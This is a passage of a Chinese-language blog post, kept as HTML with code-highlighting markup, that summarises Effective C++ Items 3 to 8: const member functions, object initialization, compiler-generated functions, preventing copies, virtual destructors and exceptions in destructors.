punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> const_cast<span class="token operator">&lt;</span><span class="token keyword">char</span> <span class="token operator">&amp;</span><span class="token operator">></span><span class="token punctuation">(</span>  <span class="token comment">//const_cast去掉const关键字，并转换为char&amp;</span>            static_cast<span class="token operator">&lt;</span><span class="token keyword">const</span> TextBook <span class="token operator">&amp;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">*</span>this<span class="token punctuation">)</span><span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//给当前变量加上const关键字，才可以调用const操作符</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>为了避免无限递归调用当前非常量的操作符，可以需要将(*this)转换为const Text&amp;类型才能保证安全调用const的操作符，最后去掉const关键字再将其返回，巧妙避免了代码的大段复制。<br>但注意，如果使用相反的方法，用const函数来调用non-const函数，就可能会有未知结果，因为这样相当于non-const函数接触到了const对象的数据，就可能导致常量数据被改变。</li></ol><p>总结：</p><ul><li><p>指针，迭代器，引用，本地变量，全局变量，成员函数，返回值都可以使用const来实现数据只读的目的，const是C++一个非常强大的特性。</p></li><li><p>除此之外，它还能帮助加快调试过程</p></li><li><p>即使编译器使用数据常量性的标准，可以编程的时候应该采用逻辑常量性，对相关不可避免更改的成员数据加上mutable关键字来修饰</p></li><li><p>当有大段复制代码出现在const和non-const的成员函数中，可以使用non-const函数来调用const函数来避免复制。</p></li></ul><h2 id="条款4-确定对象被使用前已经被初始化"><a href="#条款4-确定对象被使用前已经被初始化" class="headerlink" title="条款4 确定对象被使用前已经被初始化"></a>条款4 确定对象被使用前已经被初始化</h2><p>C++并不能保证每个对象在定义时都被自动初始化。就像书中第一条提到的一样，C++包含多种子语言，例如定义一个C风格的整型数组(int[])时，其中就可能包含非零初始化的元素。到那时STL中的容器所有元素都是被0初始化的（默认条件）。</p><ol><li><p>自有类型(built-in type)的初始化<br>C++的自有类型继承于C，因此不能保证此类型的变量在定义时被初始化。使用未初始化的数据可能会导致程序不正常运作，因此在定义变量的时候，需要对其进行初始化。</p></li><li><p>类的初始化<br>对于用户自定义的类，可以需要构造函数(constructor)来完成此类的初始化<br>例如：</p><pre class="language-c" data-language="c"><code class="language-c">class PhoneNumber <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class ABEntry<span class="token punctuation">&#123;</span> <span class="token comment">// ABEntry = “Address Book Entry”</span>public<span class="token operator">:</span>    <span class="token function">ABEntry</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>address<span class="token punctuation">,</span>            <span class="token keyword">const</span> std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> <span class="token operator">&amp;</span>phones<span class="token punctuation">)</span><span class="token punctuation">;</span>private<span class="token operator">:</span>    std<span class="token operator">::</span>string theName<span class="token punctuation">;</span>    std<span class="token operator">::</span>string theAddress<span class="token punctuation">;</span>    std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> thePhones<span class="token punctuation">;</span>    <span class="token keyword">int</span> numTimesConsulted<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>ABEntry<span class="token operator">::</span><span class="token function">ABEntry</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>address<span class="token punctuation">,</span>                 <span class="token keyword">const</span> std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> <span class="token operator">&amp;</span>phones<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    theName <span class="token operator">=</span> name<span class="token punctuation">;</span>       <span class="token comment">// these are all assignments,</span>    theAddress <span class="token operator">=</span> address<span class="token punctuation">;</span> <span class="token comment">// not initializations</span>    thePhones <span class="token operator">=</span> phones<span class="token punctuation">;</span>    numTimesConsulted <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这是个易于记忆的方法，但不是最好的方法。因为此构造函数并没有真正完成“初始化”，只不过是做了“赋值”的操作。C++规定，对象的成员变量的初始化动作发生在进入构造函数本体之前。也就是初始化的发生时间在这些成员的default构造函数被调用之时（比进入构造函数本体的时间更早）。<br>描写构造函数可以有更好的方法：</p><pre class="language-c" data-language="c"><code class="language-c">ABEntry<span class="token operator">::</span><span class="token function">ABEntry</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>address<span class="token punctuation">,</span>                 <span class="token keyword">const</span> std<span class="token operator">::</span>list<span class="token operator">&lt;</span>PhoneNumber<span class="token operator">></span> <span class="token operator">&amp;</span>phones<span class="token punctuation">)</span>    <span class="token operator">:</span> <span class="token function">theName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token function">theAddress</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// these are now all initializations</span>      <span class="token function">thePhones</span><span class="token punctuation">(</span>phones<span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token function">numTimesConsulted</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> </code></pre></li><li><p>有些初始化是必要的<br>例如在定义引用(reference)和常量(const)时，不将其初始化会导致编译器报错。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">int</span> a<span class="token punctuation">;</span>                <span class="token comment">//报错，需要初始化！</span><span class="token keyword">int</span><span class="token operator">&amp;</span> b<span class="token punctuation">;</span>                     <span class="token comment">//报错，需要初始化！</span><span class="token comment">//现在对其进行初始化：</span><span class="token keyword">const</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token comment">//编译通过</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">&amp;</span> b <span class="token operator">=</span> c<span class="token punctuation">;</span>                 <span class="token comment">//编译通过！</span></code></pre><p>最省力的方法就是总是初始化，并且使用初值列初始化，省力又高效。</p></li><li><p>初始化的顺序<br>在继承关系中，基类(base class)总是先被初始化。</p></li></ol><p>在同一类中，成员数据的初始化顺序与其声明顺序是一致的，而不是初始化列表的顺序。因此，为了代码一致性，要保证初始化列表的顺序与成员数据声明的顺序是一样的。</p><pre class="language-c" data-language="c"><code class="language-c">class myClass<span class="token punctuation">&#123;</span>  private<span class="token operator">:</span>    <span class="token keyword">int</span> a<span class="token punctuation">;</span>    <span class="token keyword">int</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token punctuation">;</span>  public<span class="token operator">:</span>    <span class="token function">myClass</span><span class="token punctuation">(</span><span class="token keyword">int</span> _a<span class="token punctuation">,</span> <span class="token keyword">int</span> _b<span class="token punctuation">,</span> <span class="token keyword">int</span> _c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//即使初始化列表是c->a->b的顺序，真正的初始化顺序还是按照a->b->c</span>myClass<span class="token operator">::</span><span class="token function">myClass</span><span class="token punctuation">(</span><span class="token keyword">int</span> _a<span class="token punctuation">,</span> <span class="token keyword">int</span> _b<span class="token punctuation">,</span> <span class="token keyword">int</span> _c<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">c</span><span class="token punctuation">(</span>_c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">a</span><span class="token punctuation">(</span>_a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">b</span><span class="token punctuation">(</span>_b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre><ol><li>初始化非本地静态对象<br>在两个编译单元中，分别包含至少一个非本地静态对象，当这些对象发生互动时，它们的初始化顺序是不确定的，所以直接使用这些变量，就会给程序的运行带来风险。</li></ol><ul><li>编译单元：可以让编译器生成代码的基本单元，一般一个源代码文件就是一个编译单元。</li><li>非本地静态对象(non-local static object): 静态对象可以是在全局范围定义的变量，在名空间范围定义的变量，函数范围内定义为static的变量，类的范围内定义为static的变量，而除了函数中的静态对象是本地的，其他都是非本地的。静态对象存在于程序的开始到结束，所以它不是基于堆(heap)或者栈(stack)的。初始化的静态对象存在于.data中，未初始化的则存在于.bss中。<br>存在以下服务端代码和客户端代码<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//服务端</span>class Server<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token keyword">extern</span> Server server<span class="token punctuation">;</span>                 <span class="token comment">//在全局范围声明外部对象server，供外部使用</span><span class="token comment">//客户端</span>class Client<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Client<span class="token operator">::</span><span class="token function">Client</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    number <span class="token operator">=</span> server<span class="token punctuation">.</span>number<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Client client<span class="token punctuation">;</span>                       <span class="token comment">//在全局范围定义client对象，自动调用了Client类的构造函数</span></code></pre>以上问题在于，定义对象client自动调用了client类的构造函数，此时需要读取对象server的数据，但全局变量的不可控性让可以不能保证对象server在此时被读取时是初始化的。试想如果还有对象client1, client2等等不同的用户读写，可以不能保证当前server的数据是可以想要的。<br>解决方法: 将全局变量变为本地静态变量<br>使用一个函数，只用来定义一个本地静态变量并返回它的引用。因为C++规定在本地范围(函数范围)内定义某静态对象时，当此函数被调用，该静态变量一定会被初始化。<pre class="language-c" data-language="c"><code class="language-c">class Server<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Server<span class="token operator">&amp;</span> <span class="token function">server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                         <span class="token comment">//将直接的声明改为一个函数</span>    <span class="token keyword">static</span> Server server<span class="token punctuation">;</span>    <span class="token keyword">return</span> server<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>class Client<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Client<span class="token operator">::</span><span class="token function">client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token comment">//客户端构造函数通过函数访问服务器数据</span>    number <span class="token operator">=</span> <span class="token function">server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>number<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Client<span class="token operator">&amp;</span> <span class="token function">client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token comment">//同样将客户端的声明改为一个函数</span>    <span class="token keyword">static</span> Client client<span class="token punctuation">;</span>    <span class="token keyword">return</span> client<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>总结：</li><li>对于自由类型，要保证在定义时手动初始化</li><li>在定义构造函数时，要用初始化列表，避免使用在函数体内的赋值初始化。在使用初始化列表时，为了保持代码一致性，初始化列表中变量的顺序要与其声明顺序相同</li><li>当不同的编译单元产生互动时，要将其中非本地的静态变量变为本地的静态变量才能保证安全的读写</li></ul><h1 id="构造、析构、赋值运算-：条款-5-12"><a href="#构造、析构、赋值运算-：条款-5-12" class="headerlink" title="构造、析构、赋值运算 ：条款(5~12)"></a>构造、析构、赋值运算 ：条款(5~12)</h1><h2 id="条款5-了解C-默默编写并调用哪些函数"><a href="#条款5-了解C-默默编写并调用哪些函数" class="headerlink" title="条款5 了解C++默默编写并调用哪些函数"></a>条款5 了解C++默默编写并调用哪些函数</h2><ol><li>C++会为类生成默认的关键函数，如默认的构造函数，拷贝赋值运算符，拷贝构造函数以及析构函数<pre class="language-c" data-language="c"><code class="language-c">class Empty <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>             <span class="token comment">//假定以下功能都会被调用，此定义等价于：</span>class Empty<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">Empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>                                <span class="token comment">//构造函数</span>    <span class="token function">Empty</span><span class="token punctuation">(</span><span class="token keyword">const</span> Empty<span class="token operator">&amp;</span> empty<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>             <span class="token comment">//拷贝构造函数</span>    <span class="token operator">~</span><span class="token function">Empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>                               <span class="token comment">//析构函数</span>    Empty<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Empty<span class="token operator">&amp;</span> empty<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>   <span class="token comment">//拷贝赋值运算符</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>对于赋值运算符，只有当代码合法且有意义，编译器才会自动生成，然而有些时候会产生错误。<pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>typename T<span class="token operator">></span>class A<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">A</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string<span class="token operator">&amp;</span> _name<span class="token punctuation">,</span> <span class="token keyword">const</span> T<span class="token operator">&amp;</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string<span class="token operator">&amp;</span> name<span class="token punctuation">;</span>    <span class="token keyword">const</span> T value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>std<span class="token operator">::</span>string <span class="token function">s1</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token operator">::</span>string <span class="token function">s2</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>A<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">a1</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>A<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">a2</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a1<span class="token operator">=</span>a2<span class="token punctuation">;</span></code></pre>如果按照默认的赋值运算符，会编译错误，相当于如下操作，自然不可使用。<pre class="language-c" data-language="c"><code class="language-c">string u <span class="token punctuation">,</span> v<span class="token punctuation">;</span>string <span class="token operator">&amp;</span>a <span class="token operator">=</span> u <span class="token punctuation">,</span><span class="token operator">&amp;</span>b <span class="token operator">=</span> v<span class="token punctuation">;</span>a <span class="token operator">=</span> b<span class="token punctuation">;</span></code></pre>此外，当基类有将赋值运算符声明为私有时，编译器也会拒绝为它的子类生成赋值运算符，因为在子类赋值过程中，它所包含的基类也应当被赋值。但是既然被声明为基类的私有成员，子类将不能调用。</li></ol><p>总结：</p><ul><li>如果自己不声明，编译器将会自动生成默认的构造函数，拷贝构造函数，拷贝赋值运算符和析构函数。</li></ul><h2 id="条款6-明确拒绝不需要的自动生成函数"><a href="#条款6-明确拒绝不需要的自动生成函数" class="headerlink" title="条款6 明确拒绝不需要的自动生成函数"></a>条款6 明确拒绝不需要的自动生成函数</h2><p>考虑如下类：<br><pre class="language-c" data-language="c"><code class="language-c">class Widget <span class="token punctuation">&#123;</span> public<span class="token operator">:</span>    <span class="token function">Widget</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">name_</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">buf_</span><span class="token punctuation">(</span>new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token operator">~</span><span class="token function">Widget</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> delete buf_<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> private<span class="token operator">:</span>    std<span class="token operator">::</span>string name_<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>buf_<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>默认生成的拷贝构造函数，会直接拷贝buf_的值，导致两个Widget对象指向同一个缓 冲区，这会导致析构的时候两次删除同一片区域的问题（这个问题又叫双杀问题），所以在某种情况下就需要禁止拷贝。</p><p>当一个父类将拷贝函数声明为私有时，编译器会拒绝为它的子类生成拷贝函数。因此可以专门使用一个父类，在其中声明拷贝操作为私有，并让可以的类继承自它。<br><pre class="language-c" data-language="c"><code class="language-c">class Uncopyable<span class="token punctuation">&#123;</span>  protected<span class="token operator">:</span>    <span class="token function">Uncopyable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">~</span><span class="token function">Uncopyable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    <span class="token function">Uncopyable</span><span class="token punctuation">(</span><span class="token keyword">const</span> Uncopyable<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">//将拷贝函数转移至此</span>    Uncopyable<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Uncopyable<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class House<span class="token operator">:</span>public Uncopyable<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>              <span class="token comment">//公有继承</span></code></pre><br>在c++11中，可以在函数列表后加上=delete防止拷贝。<br><pre class="language-c" data-language="c"><code class="language-c">class Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>private<span class="token operator">:</span><span class="token function">Base</span><span class="token punctuation">(</span>Base<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token operator">=</span>delete<span class="token punctuation">;</span>Base<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span>Base<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token operator">=</span>delete<span class="token punctuation">;</span>friend <span class="token keyword">void</span> <span class="token function">friendfunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>总结:</p><ul><li>当不想让编译器为类自动生成某些函数时，把这些不想要的函数声明在此类的私有成员中，或者更好使用像如上例子的一个父类，并让可以的类公有继承。</li></ul><h2 id="条款7-为多态基类生成virtual析构函数"><a href="#条款7-为多态基类生成virtual析构函数" class="headerlink" title="条款7 为多态基类生成virtual析构函数"></a>条款7 为多态基类生成virtual析构函数</h2><p>对于多态基类，考虑如下情况：<br><pre class="language-c" data-language="c"><code class="language-c">class TimeKeeper                              <span class="token comment">//计时器类，用来当做基类</span><span class="token punctuation">&#123;</span>                                public<span class="token operator">:</span>    <span class="token function">TimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment">//这是构造函数</span>    <span class="token operator">~</span><span class="token function">TimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">//这是析构函数</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class AtomicClock <span class="token operator">:</span> public TimeKeeper<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token comment">//原子钟是一种计时器</span>class WaterClock <span class="token operator">:</span> public TimeKeeper<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//水钟也是一种计时器</span>TimeKeeper<span class="token operator">*</span> <span class="token function">getTimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>              <span class="token comment">//用来返回一个动态分配的基类对象</span>TimeKeeper<span class="token operator">*</span> ptk <span class="token operator">=</span> <span class="token function">getTimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                         <span class="token comment">//使用这个指针操作它的子类</span>delete ptk<span class="token punctuation">;</span>                                   <span class="token comment">//使用完毕，释放资源</span></code></pre><br>C++中的new与delete常会导致内存泄漏。<br>如上代码问题在于，当你通过基类指针使用子类，使用完毕后却只从基类删除。同时这个基类的析构函数并不是虚函数(virtual)，也就是不允许子类有自己版本的析构函数，这样就只能删除子类中基类的部分，而子类衍生出来的变量和函数所占用的资源并没有被释放，这就造成了这个对象只被释放了一部分资源的现象，依然会导致内存泄漏。</p><p>解决办法：<br>给基类一个虚的析构函数，这样子类就允许拥有自己的析构函数，就能保证被占用的所有资源都会被释放。<br><pre class="language-c" data-language="c"><code class="language-c">class TimeKeeper<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token operator">~</span><span class="token function">TimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>但是！如果不用来当做基类，随便把它的析构函数声明为虚函数不是不必要，而是不好！</p><p>虚函数是用来在运行时(runtime)，自动把编译时未知的对象，比如用户输入的对象，和它所对应的函数绑定起来并调用。当一个类包含虚函数时，编译器会给这个类添加一个隐藏变量，即虚函数表指针(virtual table pointer)，用来指向一个包含函数指针的数组，即虚函数表(virtual table)。当一个虚函数被调用时，具体调用哪个函数就可以从这个表里找了。<br>问题在于，这个变量也是要占空间的！例如在32位系统里，一个地址占32位，那么这个变量就要占32位，而在64位系统就要占用64位。再举个栗子:<br><pre class="language-c" data-language="c"><code class="language-c">class Point<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">Point</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">~</span><span class="token function">Point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> y<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>这样一个Point的类包含两个整型，因此一个对象要占64位。但如果把析构函数声明为虚函数，在32位系统里就要多占32位，在64位系统里就要多占64位，那么它所占用的空间直接增大了50%到100%。这样一来，对象就刚好不能用一个64位的寄存器装下了。</p><p>对于标准库中的类不能随便继承，包括STL，因为这些库的并没有把析构函数定义为虚函数。<br><pre class="language-c" data-language="c"><code class="language-c">class SpecialString <span class="token operator">:</span> public std<span class="token operator">::</span>string<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token comment">//某个继承自标准字符串的类</span>SpecialString<span class="token operator">*</span> pss <span class="token operator">=</span> new <span class="token function">SpecialString</span><span class="token punctuation">(</span><span class="token string">"Hi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token operator">::</span>string<span class="token operator">*</span> ps<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>ps <span class="token operator">=</span> pss<span class="token punctuation">;</span>delete ps<span class="token punctuation">;</span>                                          <span class="token comment">//使用完后从基类删除内存</span></code></pre><br>如上代码会导致一开始所说的内存泄露问题。</p><p>对于抽象类(abstract class)，抽象类是包含至少一个纯虚函数的类(pure virtual function)，而且它们不能被实例化，只能通过指针来操作，是纯粹被用来当做多态的基类的。</p><p>相比于具体类(concrete class)，虽然它们都可以通过父类指针来操作子类，但抽象类有更高一层的抽象，从设计的角度上能更好概括某些类的共同特性，比如”狗”相对于”边牧”，”柴犬”，”斗牛”，把”狗”当做基类显然要好过把某个品种当做基类。</p><p>因为多态的基类需要有虚析构函数，抽象类又需要有纯虚函数，那么在抽象类中就要把析构函数声明为纯虚函数:<br><pre class="language-c" data-language="c"><code class="language-c">class VBase<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token operator">~</span><span class="token function">VBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment">//"=0"只是一个关键字，用来声明纯虚函数，并不把任何东西设为0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>同时注意，当在继承层级中某一类的析构函数被调用时，它下一级类的析构函数会被随后调用，最后一直到基类的析构函数，因此作为析构函数调用的终点，要保证有一个定义，否则链接器会报错。</p><p>一般来讲，可以使用基类都是为了实现多态，那么这些基类就需要虚的析构函数，比如可以的TimeKeeper类，就可以通过TimeKeeper的指针来操作例如AtomicClock这样的子类。但并不是所有的基类都是被用来实现多态的，比如可以在上一章讲过的Uncopyable类，单纯只是为了实现某个功能，而不是希望通过它的指针来操作某个对象，那么就不需要将析构函数声明为虚函数。以及某些类就不是用来当做基类的，比如标准库的string类和STL容器类，也不需要将析构函数声明为虚函数。</p><p>总结：</p><ul><li>用来实现多态的基类应该有声明为虚(virtual)的析构函数。如果一个基类中含有虚函数，那它就是被用来实现多态的，就需要有一个虚的析构函数</li><li>某些类不是被用来当做基类的，比如std::string和STL，或者某些不是用来实现多态的基类，比如上一章的Uncopyable，就不需要虚的析构函数。</li></ul><h2 id="条款8-别在析构函数中抛出异常"><a href="#条款8-别在析构函数中抛出异常" class="headerlink" title="条款8 别在析构函数中抛出异常"></a>条款8 别在析构函数中抛出异常</h2><p>先讲一下什么叫栈展开(stack unwinding)，才能更好理解C++异常(exception)的机制：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">throw</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token comment">//函数f1会抛出一个整型的异常代码</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f1 starts"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>                       <span class="token comment">//这个变量会在栈展开的过程中被释放资源</span>  throw <span class="token number">100</span><span class="token punctuation">;</span>                   <span class="token comment">//抛出异常，程序开始在栈中搜索对应的异常处理器，即开始栈展开</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f1 ends"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>       <span class="token comment">//这行代码不会被执行</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> f2 <span class="token function">throw</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token 